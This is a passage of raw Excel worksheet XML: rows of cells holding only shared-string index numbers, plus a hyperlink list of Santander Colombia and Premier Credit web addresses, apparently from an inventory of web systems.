      <c r="H53" s="24" t="s">
        <v>3311</v>
      </c>
      <c r="I53" s="24"/>
      <c r="J53" s="24"/>
      <c r="K53" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L53" s="24"/>
      <c r="M53" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="N53" s="24"/>
      <c r="O53" s="24"/>
      <c r="P53" s="24" t="s">
        <v>1179</v>
      </c>
    </row>
    <row r="54" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A54" s="23" t="s">
        <v>3312</v>
      </c>
      <c r="B54" s="19" t="s">
        <v>1425</v>
      </c>
      <c r="C54" s="19" t="s">
        <v>3313</v>
      </c>
      <c r="D54" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E54" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F54" s="24" t="s">
        <v>3198</v>
      </c>
      <c r="G54" s="24" t="s">
        <v>3199</v>
      </c>
      <c r="H54" s="24" t="s">
        <v>3281</v>
      </c>
      <c r="I54" s="24" t="s">
        <v>3204</v>
      </c>
      <c r="J54" s="24" t="s">
        <v>3191</v>
      </c>
      <c r="K54" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L54" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="M54" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="N54" s="24" t="s">
        <v>325</v>
      </c>
      <c r="O54" s="24"/>
      <c r="P54" s="24" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="55" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A55" s="23"/>
      <c r="B55" s="19" t="s">
        <v>3314</v>
      </c>
      <c r="C55" s="19" t="s">
        <v>3294</v>
      </c>
      <c r="D55" s="24" t="s">
        <v>3315</v>
      </c>
      <c r="E55" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F55" s="24" t="s">
        <v>3300</v>
      </c>
      <c r="G55" s="24" t="s">
        <v>3301</v>
      </c>
      <c r="H55" s="24" t="s">
        <v>3316</v>
      </c>
      <c r="I55" s="24" t="s">
        <v>3317</v>
      </c>
      <c r="J55" s="24" t="s">
        <v>3191</v>
      </c>
      <c r="K55" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L55" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="M55" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="N55" s="24" t="s">
        <v>325</v>
      </c>
      <c r="O55" s="24">
        <v>2</v>
      </c>
      <c r="P55" s="24" t="s">
        <v>3256</v>
      </c>
    </row>
    <row r="56" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A56" s="23"/>
      <c r="B56" s="19" t="s">
        <v>3318</v>
      </c>
      <c r="C56" s="19" t="s">
        <v>3294</v>
      </c>
      <c r="D56" s="24" t="s">
        <v>3319</v>
      </c>
      <c r="E56" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F56" s="24" t="s">
        <v>3300</v>
      </c>
      <c r="G56" s="24" t="s">
        <v>3301</v>
      </c>
      <c r="H56" s="24" t="s">
        <v>3320</v>
      </c>
      <c r="I56" s="24" t="s">
        <v>3317</v>
      </c>
      <c r="J56" s="24" t="s">
        <v>3191</v>
      </c>
      <c r="K56" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L56" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="M56" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="N56" s="24" t="s">
        <v>325</v>
      </c>
      <c r="O56" s="24">
        <v>2</v>
      </c>
      <c r="P56" s="24" t="s">
        <v>3256</v>
      </c>
    </row>
    <row r="57" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A57" s="23"/>
      <c r="B57" s="19" t="s">
        <v>3321</v>
      </c>
      <c r="C57" s="19" t="s">
        <v>3294</v>
      </c>
      <c r="D57" s="24" t="s">
        <v>3322</v>
      </c>
      <c r="E57" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F57" s="24" t="s">
        <v>3300</v>
      </c>
      <c r="G57" s="24" t="s">
        <v>3301</v>
      </c>
      <c r="H57" s="24" t="s">
        <v>3320</v>
      </c>
      <c r="I57" s="24" t="s">
        <v>3317</v>
      </c>
      <c r="J57" s="24" t="s">
        <v>3191</v>
      </c>
      <c r="K57" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L57" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="M57" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="N57" s="24" t="s">
        <v>325</v>
      </c>
      <c r="O57" s="24">
        <v>2</v>
      </c>
      <c r="P57" s="24" t="s">
        <v>3256</v>
      </c>
    </row>
    <row r="58" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A58" s="23"/>
      <c r="B58" s="19" t="s">
        <v>3323</v>
      </c>
      <c r="C58" s="19" t="s">
        <v>3294</v>
      </c>
      <c r="D58" s="24" t="s">
        <v>3324</v>
      </c>
      <c r="E58" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F58" s="24" t="s">
        <v>3325</v>
      </c>
      <c r="G58" s="24" t="s">
        <v>3326</v>
      </c>
      <c r="H58" s="24" t="s">
        <v>3327</v>
      </c>
      <c r="I58" s="24" t="s">
        <v>3317</v>
      </c>
      <c r="J58" s="24" t="s">
        <v>3191</v>
      </c>
      <c r="K58" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L58" s="24"/>
      <c r="M58" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="N58" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="O58" s="24">
        <v>2</v>
      </c>
      <c r="P58" s="24" t="s">
        <v>3256</v>
      </c>
    </row>
    <row r="59" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A59" s="23" t="s">
        <v>3328</v>
      </c>
      <c r="B59" s="19" t="s">
        <v>2077</v>
      </c>
      <c r="C59" s="19" t="s">
        <v>3329</v>
      </c>
      <c r="D59" s="24" t="s">
        <v>3197</v>
      </c>
      <c r="E59" s="24" t="s">
        <v>2044</v>
      </c>
      <c r="F59" s="24" t="s">
        <v>3198</v>
      </c>
      <c r="G59" s="24" t="s">
        <v>3199</v>
      </c>
      <c r="H59" s="24" t="s">
        <v>3330</v>
      </c>
      <c r="I59" s="24" t="s">
        <v>3204</v>
      </c>
      <c r="J59" s="24" t="s">
        <v>3191</v>
      </c>
      <c r="K59" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L59" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="M59" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="N59" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="O59" s="24">
        <v>4</v>
      </c>
      <c r="P59" s="24" t="s">
        <v>3239</v>
      </c>
    </row>
    <row r="60" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A60" s="23"/>
      <c r="B60" s="19" t="s">
        <v>1138</v>
      </c>
      <c r="C60" s="19" t="s">
        <v>3331</v>
      </c>
      <c r="D60" s="24" t="s">
        <v>3197</v>
      </c>
      <c r="E60" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F60" s="24" t="s">
        <v>3332</v>
      </c>
      <c r="G60" s="24" t="s">
        <v>3333</v>
      </c>
      <c r="H60" s="24" t="s">
        <v>3334</v>
      </c>
      <c r="I60" s="24"/>
      <c r="J60" s="24" t="s">
        <v>3262</v>
      </c>
      <c r="K60" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L60" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="M60" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="N60" s="24"/>
      <c r="O60" s="24"/>
      <c r="P60" s="24" t="s">
        <v>3335</v>
      </c>
    </row>
    <row r="61" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A61" s="23"/>
      <c r="B61" s="48" t="s">
        <v>3336</v>
      </c>
      <c r="C61" s="19"/>
      <c r="D61" s="24" t="s">
        <v>3197</v>
      </c>
      <c r="E61" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F61" s="24"/>
      <c r="G61" s="24"/>
      <c r="H61" s="24"/>
      <c r="I61" s="24"/>
      <c r="J61" s="24"/>
      <c r="K61" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L61" s="24"/>
      <c r="M61" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="N61" s="24"/>
      <c r="O61" s="24"/>
      <c r="P61" s="24" t="s">
        <v>3337</v>
      </c>
      <c r="Q61" t="s">
        <v>3338</v>
      </c>
    </row>
    <row r="62" spans="1:17" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A62" s="46" t="s">
        <v>3339</v>
      </c>
      <c r="B62" s="19" t="s">
        <v>2683</v>
      </c>
      <c r="C62" s="19" t="s">
        <v>3340</v>
      </c>
      <c r="D62" s="24" t="s">
        <v>3197</v>
      </c>
      <c r="E62" s="24" t="s">
        <v>2044</v>
      </c>
      <c r="F62" s="24" t="s">
        <v>3325</v>
      </c>
      <c r="G62" s="24" t="s">
        <v>3326</v>
      </c>
      <c r="H62" s="24" t="s">
        <v>3341</v>
      </c>
      <c r="I62" s="24" t="s">
        <v>3342</v>
      </c>
      <c r="J62" s="24" t="s">
        <v>3191</v>
      </c>
      <c r="K62" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L62" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="M62" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="N62" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="O62" s="24"/>
      <c r="P62" s="24" t="s">
        <v>3239</v>
      </c>
    </row>
    <row r="63" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A63" s="23"/>
      <c r="B63" s="19" t="s">
        <v>3343</v>
      </c>
      <c r="C63" s="19"/>
      <c r="D63" s="24" t="s">
        <v>3344</v>
      </c>
      <c r="E63" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F63" s="24"/>
      <c r="G63" s="24"/>
      <c r="H63" s="24"/>
      <c r="I63" s="24" t="s">
        <v>3261</v>
      </c>
      <c r="J63" s="24" t="s">
        <v>3262</v>
      </c>
      <c r="K63" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L63" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="M63" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="N63" s="24"/>
      <c r="O63" s="24">
        <v>1</v>
      </c>
      <c r="P63" s="24" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="64" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A64" s="23">
        <v>190145127237</v>
      </c>
      <c r="B64" s="19" t="s">
        <v>2092</v>
      </c>
      <c r="C64" s="19" t="s">
        <v>3345</v>
      </c>
      <c r="D64" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E64" s="24" t="s">
        <v>2044</v>
      </c>
      <c r="F64" s="24" t="s">
        <v>3198</v>
      </c>
      <c r="G64" s="24" t="s">
        <v>3199</v>
      </c>
      <c r="H64" s="24" t="s">
        <v>3346</v>
      </c>
      <c r="I64" s="24" t="s">
        <v>3204</v>
      </c>
      <c r="J64" s="24" t="s">
        <v>3191</v>
      </c>
      <c r="K64" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L64" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="M64" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="N64" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="O64" s="24"/>
      <c r="P64" s="24" t="s">
        <v>3239</v>
      </c>
    </row>
    <row r="65" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A65" s="23" t="s">
        <v>1940</v>
      </c>
      <c r="B65" s="19"/>
      <c r="C65" s="19" t="s">
        <v>3347</v>
      </c>
      <c r="D65" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E65" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F65" s="24"/>
      <c r="G65" s="24"/>
      <c r="H65" s="24"/>
      <c r="I65" s="24"/>
      <c r="J65" s="24"/>
      <c r="K65" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L65" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="M65" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="N65" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="O65" s="24">
        <v>6</v>
      </c>
      <c r="P65" s="24" t="s">
        <v>3348</v>
      </c>
    </row>
    <row r="66" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A66" s="23" t="s">
        <v>3208</v>
      </c>
      <c r="B66" s="19" t="s">
        <v>2099</v>
      </c>
      <c r="C66" s="19" t="s">
        <v>3349</v>
      </c>
      <c r="D66" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E66" s="24" t="s">
        <v>2044</v>
      </c>
      <c r="F66" s="24" t="s">
        <v>3300</v>
      </c>
      <c r="G66" s="24" t="s">
        <v>3301</v>
      </c>
      <c r="H66" s="24" t="s">
        <v>3302</v>
      </c>
      <c r="I66" s="24" t="s">
        <v>3204</v>
      </c>
      <c r="J66" s="24" t="s">
        <v>3191</v>
      </c>
      <c r="K66" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L66" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="M66" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="N66" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="O66" s="24"/>
      <c r="P66" s="24" t="s">
        <v>3239</v>
      </c>
    </row>
    <row r="67" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A67" s="23"/>
      <c r="B67" s="19" t="s">
        <v>3350</v>
      </c>
      <c r="C67" s="19"/>
      <c r="D67" s="24"/>
      <c r="E67" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F67" s="24" t="s">
        <v>3265</v>
      </c>
      <c r="G67" s="24" t="s">
        <v>3199</v>
      </c>
      <c r="H67" s="24" t="s">
        <v>3351</v>
      </c>
      <c r="I67" s="24"/>
      <c r="J67" s="24" t="s">
        <v>3262</v>
      </c>
      <c r="K67" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L67" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="M67" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="N67" s="24"/>
      <c r="O67" s="24"/>
      <c r="P67" s="24" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="68" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A68" s="23"/>
      <c r="B68" s="19" t="s">
        <v>3352</v>
      </c>
      <c r="C68" s="19" t="s">
        <v>3353</v>
      </c>
      <c r="D68" s="24"/>
      <c r="E68" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F68" s="24" t="s">
        <v>3325</v>
      </c>
      <c r="G68" s="24" t="s">
        <v>3326</v>
      </c>
      <c r="H68" s="24" t="s">
        <v>3354</v>
      </c>
      <c r="I68" s="24" t="s">
        <v>3342</v>
      </c>
      <c r="J68" s="24" t="s">
        <v>3262</v>
      </c>
      <c r="K68" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L68" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="M68" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="N68" s="24"/>
      <c r="O68" s="24"/>
      <c r="P68" s="24" t="s">
        <v>969</v>
      </c>
      <c r="Q68" t="s">
        <v>3355</v>
      </c>
    </row>
    <row r="69" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A69" s="23"/>
      <c r="B69" s="19" t="s">
        <v>3356</v>
      </c>
      <c r="C69" s="19" t="s">
        <v>1323</v>
      </c>
      <c r="D69" s="24"/>
      <c r="E69" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F69" s="24" t="s">
        <v>3325</v>
      </c>
      <c r="G69" s="24" t="s">
        <v>3326</v>
      </c>
      <c r="H69" s="24" t="s">
        <v>3357</v>
      </c>
      <c r="I69" s="24" t="s">
        <v>3342</v>
      </c>
      <c r="J69" s="24" t="s">
        <v>3262</v>
      </c>
      <c r="K69" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L69" s="24"/>
      <c r="M69" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="N69" s="24"/>
      <c r="O69" s="24"/>
      <c r="P69" s="24" t="s">
        <v>969</v>
      </c>
      <c r="Q69" t="s">
        <v>3355</v>
      </c>
    </row>
    <row r="70" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A70" s="23"/>
      <c r="B70" s="19" t="s">
        <v>2162</v>
      </c>
      <c r="C70" s="19" t="s">
        <v>3358</v>
      </c>
      <c r="D70" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E70" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F70" s="24" t="s">
        <v>3325</v>
      </c>
      <c r="G70" s="24" t="s">
        <v>3326</v>
      </c>
      <c r="H70" s="24" t="s">
        <v>3359</v>
      </c>
      <c r="I70" s="24" t="s">
        <v>3243</v>
      </c>
      <c r="J70" s="24" t="s">
        <v>3262</v>
      </c>
      <c r="K70" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L70" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="M70" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="N70" s="24"/>
      <c r="O70" s="24"/>
      <c r="P70" s="24" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="71" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A71" s="23"/>
      <c r="B71" s="19" t="s">
        <v>3360</v>
      </c>
      <c r="C71" s="19" t="s">
        <v>3361</v>
      </c>
      <c r="D71" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E71" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F71" s="24"/>
      <c r="G71" s="24"/>
      <c r="H71" s="24"/>
      <c r="I71" s="24" t="s">
        <v>3243</v>
      </c>
      <c r="J71" s="24" t="s">
        <v>3262</v>
      </c>
      <c r="K71" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L71" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="M71" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="N71" s="24"/>
      <c r="O71" s="24"/>
      <c r="P71" s="24" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="72" spans="1:17" ht="29" x14ac:dyDescent="0.35">
      <c r="A72" s="49" t="s">
        <v>3362</v>
      </c>
      <c r="B72" s="19" t="s">
        <v>3363</v>
      </c>
      <c r="C72" s="19" t="s">
        <v>3364</v>
      </c>
      <c r="D72" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E72" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F72" s="24"/>
      <c r="G72" s="24"/>
      <c r="H72" s="24"/>
      <c r="I72" s="24" t="s">
        <v>3243</v>
      </c>
      <c r="J72" s="24" t="s">
        <v>3191</v>
      </c>
      <c r="K72" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L72" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="M72" s="24" t="s">
        <v>3195</v>
      </c>
      <c r="N72" s="24"/>
      <c r="O72" s="24"/>
      <c r="P72" s="24" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="73" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A73" s="23"/>
      <c r="B73" s="19" t="s">
        <v>2914</v>
      </c>
      <c r="C73" s="19" t="s">
        <v>3365</v>
      </c>
      <c r="D73" s="24" t="s">
        <v>3183</v>
      </c>
      <c r="E73" s="24" t="s">
        <v>2044</v>
      </c>
      <c r="F73" s="24" t="s">
        <v>3366</v>
      </c>
      <c r="G73" s="24" t="s">
        <v>3367</v>
      </c>
      <c r="H73" s="24" t="s">
        <v>3368</v>
      </c>
      <c r="I73" s="24" t="s">
        <v>3342</v>
      </c>
      <c r="J73" s="24" t="s">
        <v>3191</v>
      </c>
      <c r="K73" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L73" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="M73" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="N73" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="O73" s="24"/>
      <c r="P73" s="24" t="s">
        <v>3239</v>
      </c>
      <c r="Q73" s="34" t="s">
        <v>3369</v>
      </c>
    </row>
    <row r="74" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A74" s="23"/>
      <c r="B74" s="19" t="s">
        <v>1391</v>
      </c>
      <c r="C74" s="19" t="s">
        <v>1323</v>
      </c>
      <c r="D74" s="24"/>
      <c r="E74" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F74" s="24" t="s">
        <v>3198</v>
      </c>
      <c r="G74" s="24" t="s">
        <v>3199</v>
      </c>
      <c r="H74" s="24" t="s">
        <v>3220</v>
      </c>
      <c r="I74" s="24" t="s">
        <v>3342</v>
      </c>
      <c r="J74" s="24" t="s">
        <v>3191</v>
      </c>
      <c r="K74" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L74" s="24"/>
      <c r="M74" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="N74" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="O74" s="24"/>
      <c r="P74" s="24" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="75" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A75" s="23"/>
      <c r="B75" s="19" t="s">
        <v>1395</v>
      </c>
      <c r="C75" s="19" t="s">
        <v>1323</v>
      </c>
      <c r="D75" s="24"/>
      <c r="E75" s="24" t="s">
        <v>32</v>
      </c>
      <c r="F75" s="24" t="s">
        <v>3198</v>
      </c>
      <c r="G75" s="24" t="s">
        <v>3199</v>
      </c>
      <c r="H75" s="24" t="s">
        <v>3220</v>
      </c>
      <c r="I75" s="24" t="s">
        <v>3342</v>
      </c>
      <c r="J75" s="24" t="s">
        <v>3191</v>
      </c>
      <c r="K75" s="24" t="s">
        <v>3192</v>
      </c>
      <c r="L75" s="24"/>
      <c r="M75" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="N75" s="24" t="s">
        <v>3193</v>
      </c>
      <c r="O75" s="24"/>
      <c r="P75" s="24" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="76" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A76" s="23"/>
      <c r="B76" s="23" t="s">
        <v>3370</v>
      </c>
      <c r="C76" s="23" t="s">
        <v>3371</v>
      </c>
      <c r="D76" s="23" t="s">
        <v>3372</v>
      </c>
      <c r="E76" s="23" t="s">
        <v>32</v>
      </c>
      <c r="F76" s="23"/>
      <c r="G76" s="23" t="s">
        <v>3326</v>
      </c>
      <c r="H76" s="23"/>
      <c r="I76" s="23" t="s">
        <v>3261</v>
      </c>
      <c r="J76" s="23" t="s">
        <v>3261</v>
      </c>
      <c r="K76" s="23" t="s">
        <v>3192</v>
      </c>
      <c r="L76" s="23" t="s">
        <v>3373</v>
      </c>
      <c r="M76" s="23" t="s">
        <v>3213</v>
      </c>
      <c r="N76" s="23" t="s">
        <v>3193</v>
      </c>
      <c r="O76" s="23">
        <v>0</v>
      </c>
      <c r="P76" s="23" t="s">
        <v>3374</v>
      </c>
    </row>
    <row r="77" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A77" s="23"/>
      <c r="B77" s="23" t="s">
        <v>3375</v>
      </c>
      <c r="C77" s="23" t="s">
        <v>3376</v>
      </c>
      <c r="D77" s="23" t="s">
        <v>3197</v>
      </c>
      <c r="E77" s="23" t="s">
        <v>32</v>
      </c>
      <c r="F77" s="23"/>
      <c r="G77" s="23" t="s">
        <v>3326</v>
      </c>
      <c r="H77" s="23"/>
      <c r="I77" s="23" t="s">
        <v>3261</v>
      </c>
      <c r="J77" s="23" t="s">
        <v>3261</v>
      </c>
      <c r="K77" s="23" t="s">
        <v>3192</v>
      </c>
      <c r="L77" s="23" t="s">
        <v>3373</v>
      </c>
      <c r="M77" s="23" t="s">
        <v>3213</v>
      </c>
      <c r="N77" s="23" t="s">
        <v>3193</v>
      </c>
      <c r="O77" s="23">
        <v>0</v>
      </c>
      <c r="P77" s="23" t="s">
        <v>3374</v>
      </c>
    </row>
    <row r="78" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A78" s="23"/>
      <c r="B78" s="23" t="s">
        <v>3377</v>
      </c>
      <c r="C78" s="23" t="s">
        <v>325</v>
      </c>
      <c r="D78" s="23" t="s">
        <v>3197</v>
      </c>
      <c r="E78" s="23" t="s">
        <v>32</v>
      </c>
      <c r="F78" s="23"/>
      <c r="G78" s="23" t="s">
        <v>3326</v>
      </c>
      <c r="H78" s="23"/>
      <c r="I78" s="23" t="s">
        <v>3261</v>
      </c>
      <c r="J78" s="23" t="s">
        <v>3261</v>
      </c>
      <c r="K78" s="23" t="s">
        <v>3192</v>
      </c>
      <c r="L78" s="23"/>
      <c r="M78" s="23" t="s">
        <v>3213</v>
      </c>
      <c r="N78" s="23" t="s">
        <v>3193</v>
      </c>
      <c r="O78" s="23">
        <v>0</v>
      </c>
      <c r="P78" s="23" t="s">
        <v>3374</v>
      </c>
    </row>
    <row r="79" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A79" s="23"/>
      <c r="B79" s="23" t="s">
        <v>3378</v>
      </c>
      <c r="C79" s="23" t="s">
        <v>325</v>
      </c>
      <c r="D79" s="23" t="s">
        <v>3197</v>
      </c>
      <c r="E79" s="23" t="s">
        <v>32</v>
      </c>
      <c r="F79" s="23"/>
      <c r="G79" s="23"/>
      <c r="H79" s="23"/>
      <c r="I79" s="23" t="s">
        <v>3261</v>
      </c>
      <c r="J79" s="23" t="s">
        <v>3261</v>
      </c>
      <c r="K79" s="23" t="s">
        <v>3192</v>
      </c>
      <c r="L79" s="23"/>
      <c r="M79" s="23" t="s">
        <v>3213</v>
      </c>
      <c r="N79" s="23" t="s">
        <v>3193</v>
      </c>
      <c r="O79" s="23">
        <v>0</v>
      </c>
      <c r="P79" s="23" t="s">
        <v>3374</v>
      </c>
    </row>
    <row r="80" spans="1:17" x14ac:dyDescent="0.35">
      <c r="A80" s="23"/>
      <c r="C80" s="23"/>
      <c r="D80" s="23" t="s">
        <v>3372</v>
      </c>
      <c r="E80" s="23" t="s">
        <v>32</v>
      </c>
      <c r="F80" s="23"/>
      <c r="G80" s="23"/>
      <c r="H80" s="23"/>
      <c r="I80" s="23"/>
      <c r="J80" s="23" t="s">
        <v>3191</v>
      </c>
      <c r="K80" s="23" t="s">
        <v>3192</v>
      </c>
      <c r="L80" s="23"/>
      <c r="M80" s="23"/>
      <c r="N80" s="23"/>
      <c r="O80" s="23"/>
      <c r="P80" s="23" t="s">
        <v>2023</v>
      </c>
    </row>
    <row r="81" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A81" s="23"/>
      <c r="C81" s="23"/>
      <c r="D81" s="23" t="s">
        <v>3197</v>
      </c>
      <c r="E81" s="23" t="s">
        <v>32</v>
      </c>
      <c r="F81" s="23"/>
      <c r="G81" s="23"/>
      <c r="H81" s="23"/>
      <c r="I81" s="23"/>
      <c r="J81" s="23" t="s">
        <v>3191</v>
      </c>
      <c r="K81" s="23" t="s">
        <v>3192</v>
      </c>
      <c r="L81" s="23"/>
      <c r="M81" s="23"/>
      <c r="N81" s="23"/>
      <c r="O81" s="23"/>
      <c r="P81" s="23" t="s">
        <v>2023</v>
      </c>
    </row>
    <row r="82" spans="1:16" x14ac:dyDescent="0.35">
      <c r="A82" s="23"/>
      <c r="B82" s="23" t="s">
        <v>3379</v>
      </c>
      <c r="C82" s="23" t="s">
        <v>3380</v>
      </c>
      <c r="D82" s="23" t="s">
        <v>3372</v>
      </c>
      <c r="E82" s="23" t="s">
        <v>32</v>
      </c>
      <c r="F82" s="23"/>
      <c r="G82" s="23"/>
      <c r="H82" s="23"/>
      <c r="I82" s="23"/>
      <c r="J82" s="23" t="s">
        <v>3191</v>
      </c>
      <c r="K82" s="23" t="s">
        <v>3192</v>
      </c>
      <c r="L82" s="23" t="s">
        <v>3195</v>
      </c>
      <c r="M82" s="23" t="s">
        <v>3213</v>
      </c>
      <c r="N82" s="23" t="s">
        <v>3193</v>
      </c>
      <c r="O82" s="23"/>
      <c r="P82" s="23" t="s">
        <v>3256</v>
      </c>
    </row>
    <row r="83" spans="1:16" s="23" customFormat="1" x14ac:dyDescent="0.35">
      <c r="B83" s="23" t="s">
        <v>3381</v>
      </c>
      <c r="C83" s="23" t="s">
        <v>3382</v>
      </c>
      <c r="D83" s="23" t="s">
        <v>3197</v>
      </c>
      <c r="E83" s="23" t="s">
        <v>32</v>
      </c>
      <c r="J83" s="23" t="s">
        <v>3191</v>
      </c>
      <c r="K83" s="23" t="s">
        <v>3192</v>
      </c>
      <c r="L83" s="23" t="s">
        <v>3195</v>
      </c>
      <c r="M83" s="23" t="s">
        <v>3383</v>
      </c>
      <c r="N83" s="23" t="s">
        <v>3384</v>
      </c>
      <c r="P83" s="23" t="s">
        <v>3385</v>
      </c>
    </row>
  </sheetData>
  <autoFilter ref="A1:Q83" xr:uid="{00000000-0001-0000-0300-000000000000}"/>
  <hyperlinks>
    <hyperlink ref="B2" r:id="rId1" display="https://confirming.santander.com.co/" xr:uid="{00000000-0004-0000-0300-000000000000}"/>
    <hyperlink ref="B27" r:id="rId2" display="https://confirming-factoring.santander.com.co" xr:uid="{00000000-0004-0000-0300-000002000000}"/>
    <hyperlink ref="B11" r:id="rId3" display="https://bpm.premiercredit.co:8000/" xr:uid="{00000000-0004-0000-0300-000004000000}"/>
    <hyperlink ref="B10" r:id="rId4" xr:uid="{00000000-0004-0000-0300-000006000000}"/>
    <hyperlink ref="B16" r:id="rId5" xr:uid="{00000000-0004-0000-0300-000008000000}"/>
    <hyperlink ref="B17" r:id="rId6" xr:uid="{00000000-0004-0000-0300-00000B000000}"/>
    <hyperlink ref="B14" r:id="rId7" display="https://mft.santanderconsumer.co/webclient/Login.xhtml" xr:uid="{00000000-0004-0000-0300-000009000000}"/>
